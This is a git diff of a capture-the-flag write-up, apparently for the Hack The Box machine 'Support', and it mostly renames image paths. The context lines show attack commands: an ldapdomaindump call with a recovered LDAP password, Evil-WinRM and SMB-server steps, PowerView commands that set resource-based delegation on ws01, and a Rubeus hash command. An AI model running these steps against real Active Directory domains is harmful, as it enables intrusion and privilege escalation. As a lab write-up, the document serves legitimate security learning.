@@ -4,7 +4,7 @@ description: 10-22-22
 
 # Support (Easy)
 
-<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Information Gathering
 
@@ -240,7 +240,7 @@ We can now run UserInfo.exe on kali:
 
 Displaying Help:
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Getting user information on my name:
 
@@ -248,14 +248,14 @@ Getting user information on my name:
 
 * Now, let's run the same command and pay attention to wireshark
 
-<figure><img src="../../../.gitbook/assets/image (3) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 * Time to dive into these packets
 * If we right-click the first packet and follow the TCP stream, we can dive deeper
 
 Following TCP Stream on Wireshark from LDAP traffic (from UserInfo.exe):
 
-<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * This is the cleartext request!
 
@@ -284,7 +284,7 @@ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.su
 
 ### Evil-WinRM
 
-<figure><img src="../../../.gitbook/assets/image (1) (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 * We have success!
 
@@ -298,11 +298,11 @@ Establishing SMB Server for easy file transfer:
 impacket-smbserver smb . -smb2support
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Transferring files to aid in enumeration:
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 adPEAS:
 
@@ -378,7 +378,7 @@ $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 &#x20;5\. Now, we can generate the RC4 hash using Rubeus:
 
@@ -386,7 +386,7 @@ Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofot
 .\Rubeus.exe hash /password:Password1 /user:fakehaha1 /domain:support.htb
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 * It is labeled rc4\_hmac: <mark style="color:yellow;">64F12CDDAA88057E06A81B54E73B949B</mark>
 
